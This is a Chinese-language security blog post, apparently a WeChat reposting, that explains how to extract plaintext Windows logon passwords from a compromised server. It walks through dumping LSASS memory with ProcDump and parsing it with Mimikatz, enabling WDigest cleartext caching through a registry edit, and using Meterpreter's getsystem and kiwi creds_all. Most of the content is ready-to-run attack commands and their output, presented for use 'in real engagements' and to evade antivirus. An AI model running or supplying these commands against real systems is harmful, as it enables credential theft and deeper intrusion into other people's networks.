> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ELcTWK2lAbMPBkNgY3gJeQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif)  

> **文章来源：****Bypass**

在实战中，拿到一台 Windows 服务器权限，如果可以直接获取 Windows 明文密码的话，就可以更容易深入挖掘。本文分享几个获取 Windows 明文密码的技巧，简单直接且有效。  

**01、Procdump+Mimikatz**  

利用 procdump+Mimikatz 绕过杀软获取 Windows 明文密码。

（1）工具准备：

ProcDump：

```
https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump

```

mimikatz：

```
https://github.com/gentilkiwi/mimikatz/

```

（2）Windows Server 2008 R2 提取明文密码

在目标机器上生成存储文件：

```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4k19FnX0xTgnO0qXN9NZ5nfqRVNdFb2Iawy5xjLM9gKSibgws7fycLYRicic9fWYOVPgWSgDdGtWqGMg/640?wx_fmt=png)

将 lsass.dmp 复制到本地，使用 mimikatz 一行命令将结果输出到文本。  

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"> pssword.txt

```

如图：成功从内存中提取明文密码。

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4k19FnX0xTgnO0qXN9NZ5nfiaX4e1rZkDibIsxkQNFto05iaEwR91MHODNEOLQmzV5buhWgZ8ROlVlfw/640?wx_fmt=png)

**02、Window 2012 R2 抓取密码**

在 Windows2012 系统及以上的系统，默认在内存缓存中禁止保存明文密码的。攻击者可以通过修改注册表的方式抓取明文，需要用户重新登录后才能成功抓取。

（1）修改注册表

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

```

（2）用户 administrator 注销后重新登录，成功抓取到明文信息。

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" > pssword.txt

```

**03、MSF kiwi 模块**

使用 kiwi 模块需要 system 权限，所以我们在使用该模块之前需要将当前 MSF 中的 shell 提升为 system。

提到 system 有两个方法，一是当前的权限是 administrator 用户，二是利用其它手段先提权到 administrator 用户。然后 administrator 用户可以直接 getsystem 到 system 权限。

```
meterpreter > getuid
Server username: BYPASS-E97BA3FC\Administrator
meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

加载 kiwi 模块：

```
load kiwi

```

列举系统中的明文密码：

```
creds_all

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4k19FnX0xTgnO0qXN9NZ5nfbiajJOQXzhFpRNiaZMiblUeMhqeCuzjb0WK08cnHBIbRvtL70AnRTUqww/640?wx_fmt=png)

侵权请私聊公众号删文

![](https://mmbiz.qpic.cn/mmbiz_jpg/3xxicXNlTXLicjiasf4mjVyxw4RbQt9odm9nxs9434icI9TG8AXHjS3Btc6nTWgSPGkvvXMb7jzFUTbWP7TKu6EJ6g/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLib0FWIDRa9Kwh52ibXkf9AAkntMYBpLvaibEiaVibzNO1jiaVV7eSibPuMU3mZfCK8fWz6LicAAzHOM8bZUw/640?wx_fmt=jpeg)  

![](https://mmbiz.qpic.cn/mmbiz_gif/NZycfjXibQzlug4f7dWSUNbmSAia9VeEY0umcbm5fPmqdHj2d12xlsic4wefHeHYJsxjlaMSJKHAJxHnr1S24t5DQ/640?wx_fmt=gif)